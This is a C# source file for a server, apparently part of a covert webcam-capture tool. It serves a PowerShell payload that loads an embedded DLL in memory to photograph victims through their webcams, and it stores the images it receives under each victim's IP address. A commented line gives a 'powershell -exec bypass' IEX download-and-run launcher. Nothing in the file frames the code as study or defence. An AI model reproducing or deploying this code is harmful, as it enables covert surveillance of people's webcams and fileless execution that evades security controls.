using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;

namespace CamControl
{
    class WebServer
    {

        private Thread _serverThread;
        private HttpListener _listener;
        private int _port;
        private String _instanceId;
        private DirectoryInfo _dir;

        public int Port
        {
            get { return _port; }
            private set { }
        }

        public String InstanceId
        {
            get { return _instanceId; }
            private set { }
        }

        /// <summary>
        /// Construct server with given port.
        /// </summary>
        /// <param name="port">Port of the server.</param>
        public WebServer(int port)
        {
            this._instanceId = Guid.NewGuid().ToString().Replace("-", "");
#if DEBUG
            this._instanceId = "debug";
#endif

            System.Reflection.Assembly asm = System.Reflection.Assembly.GetExecutingAssembly();
            _dir = new DirectoryInfo(Path.Combine(Path.GetDirectoryName(asm.Location), "Images"));
            if (!_dir.Exists)
                _dir.Create();


            this.Initialize(port);
        }


        /// <summary>
        /// Stop server and dispose all functions.
        /// </summary>
        public void Stop()
        {
            _serverThread.Abort();
            _listener.Stop();
        }

        private void Listen()
        {
            _listener = new HttpListener();

            //Esse prefixo só funciona de tiver elevado com o UAC
            _listener.Prefixes.Add("http://*:" + _port.ToString() + "/");
            //_listener.Prefixes.Add("http://localhost:" + _port.ToString() + "/");
            _listener.Start();
            while (true)
            {
                try
                {
                    HttpListenerContext context = _listener.GetContext();
                    Process(context);
                }
                catch (Exception ex)
                {

                }
            }
        }

        private void Process(HttpListenerContext context)
        {
            String path = context.Request.Url.AbsolutePath;
            path = path.TrimEnd("/ ".ToCharArray());

            if (path == "/" + this._instanceId)
            {

                if (context.Request.HttpMethod == "GET")
                {

                    Console.WriteLine("Request from " + context.Request.RemoteEndPoint.Address.ToString());

                    try
                    {

                        Byte[] libData = System.IO.File.ReadAllBytes("CamLib.dll");
                        String encoded_string = Convert.ToBase64String(libData);

                        StringBuilder payload = new StringBuilder();

                        payload.AppendLine("$data = \"\"");
                        Int32 size = 76;

                        if (encoded_string.Length > size)
                        {

                            int stringLength = encoded_string.Length;
                            for (int i = 0; i < stringLength; i += size)
                            {
                                if (i + size > stringLength) size = stringLength - i;
                                payload.AppendLine("$data += \"" + encoded_string.Substring(i, size) + "\"");

                            }

                        }
                        else
                        {
                            payload.AppendLine("$data += \"" + encoded_string + "\"");
                        }


                        //'http://+:"+ this._port +"/"+ this._instanceId +"'
                        payload.AppendLine("$uri += \"http://" + context.Request.Url.Host + ":" + context.Request.Url.Port + "/" + this._instanceId + "\"");
                        payload.AppendLine("$tmp = [Reflection.Assembly]::Load([Convert]::FromBase64String($data))");
                        payload.AppendLine("$ci = new-object CamLib.Camera");
                        payload.AppendLine("$ci.Shot($uri)");


                        //Adding permanent http response headers
                        context.Response.ContentType = "text/text; charset=utf-8";
                        context.Response.ContentLength64 = payload.Length;
                        context.Response.AddHeader("Date", DateTime.Now.ToString("r"));
                        context.Response.AddHeader("Last-Modified", DateTime.Now.ToString("r"));

                        Byte[] data = Encoding.UTF8.GetBytes(payload.ToString());

                        context.Response.OutputStream.Write(data, 0, data.Length);

                        context.Response.StatusCode = (int)HttpStatusCode.OK;
                        context.Response.OutputStream.Flush();
                    }
                    catch (Exception ex)
                    {
                        context.Response.StatusCode = (int)HttpStatusCode.InternalServerError;
                    }
                }
                else if (context.Request.HttpMethod == "PUT")
                {
                    Console.WriteLine("Image data from " + context.Request.RemoteEndPoint.Address.ToString());

                    try
                    {


                        using (Stream receiveStream = context.Request.InputStream)
                        {
                            using (StreamReader readStream = new StreamReader(receiveStream, Encoding.UTF8))
                            {
                                String rData = readStream.ReadToEnd();

                                //Console.WriteLine(rData);

                                Int32 count = 1;

                                MatchCollection mc = Regex.Matches(rData.Replace("\r", "").Replace("\n", ""), "--------JPG_INIT------(.*)------JPG_END--------", RegexOptions.IgnoreCase | RegexOptions.Multiline);
                                foreach (Match m in mc)
                                {
                                    if (m.Success)
                                    {
                                        try
                                        {
                                            String b64 = m.Groups[1].Value;

                                            using (MemoryStream s = new MemoryStream(Convert.FromBase64String(b64)))
                                            {
                                                Image jpg = (Image)Bitmap.FromStream(s);
                                                float black = CalcBlack(jpg, 10);

                                                FileInfo f = new FileInfo(Path.Combine(_dir.FullName, context.Request.RemoteEndPoint.Address.ToString() + "-" + ToUnixTime(DateTime.Now).ToString() + "-" + count + (black >= 80 ? "-black" : "-valid") + ".jpg"));

                                                Console.WriteLine("\tFile saved at " + f.FullName.Replace(_dir.FullName, "") + " with " + black.ToString("0.00") + "% of black pixels");
                                                jpg.Save(f.FullName, ImageFormat.Jpeg);
                                                
                                                count++;
                                            }
                                        }
                                        catch
                                        {
                                            Console.WriteLine("Error decoding image data.");
                                        }
                                    }
                                }


                            }
                        }

                        context.Response.StatusCode = (int)HttpStatusCode.OK;

                    }
                    catch (Exception ex)
                    {
                        context.Response.StatusCode = (int)HttpStatusCode.InternalServerError;
                    }
                }
            }
            else
            {
                context.Response.StatusCode = (int)HttpStatusCode.NotFound;
            }


            context.Response.OutputStream.Close();
        }

        private long ToUnixTime(DateTime date)
        {
            var epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
            return Convert.ToInt64((date.ToUniversalTime() - epoch).TotalSeconds);
        }

        private void Initialize(int port)
        {
            this._port = port;
            _serverThread = new Thread(this.Listen);
            _serverThread.Start();
            //Console.WriteLine("powershell.exe -exec bypass -Command IEX (New-Object system.Net.WebClient).DownloadString('http://+:"+ this._port +"/"+ this._instanceId +"');");
            Console.WriteLine("Starting web server at " + this.Port);
        }

        private float CalcBlack(Image image, Int32 tolerance)
        {
            Bitmap bmp = (Bitmap)image;
            float totalColor = bmp.Width * bmp.Height;
            float blackColor = 0; 
            RGB baseColor = new RGB(Color.Black);
            
            for (int x = 0; x < bmp.Width; x++)
            {
                for (int y = 0; y < bmp.Height; y++)
                {
                    Color px = bmp.GetPixel(x, y);
                    if (baseColor.Equal(px, tolerance))
                        blackColor++;
                }

            }

            return ((blackColor / totalColor) * 100F);
        }
            
        /*
        private Boolean IsBlackOld(Image image, Int32 tolerance, Int32 percent = 80)
        {

            Int32 black = 0;

            if (tolerance > 255)
                tolerance = 255;

            Bitmap bmp = (Bitmap)image.Clone();

            // Lock the bitmap's bits.  
            Rectangle rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
            BitmapData bmpData = bmp.LockBits(rect, ImageLockMode.ReadWrite, bmp.PixelFormat);

            // Get the address of the first line.
            IntPtr ptr = bmpData.Scan0;

            // Declare an array to hold the bytes of the bitmap.
            int bytes = bmpData.Stride * bmp.Height;
            byte[] rgbValues = new byte[bytes];

            // Copy the RGB values into the array.
            Marshal.Copy(ptr, rgbValues, 0, bytes);

            // Scanning for non-zero bytes
            bool allBlack = true;
            for (int index = 0; index < rgbValues.Length; index++)
                if (rgbValues[index] <= tolerance)
                {
                    black++;
                    
                }
            // Unlock the bits.
            bmp.UnlockBits(bmpData);

            return ((black / rgbValues.Length)*100) >= percent;
        }*/

    }
}
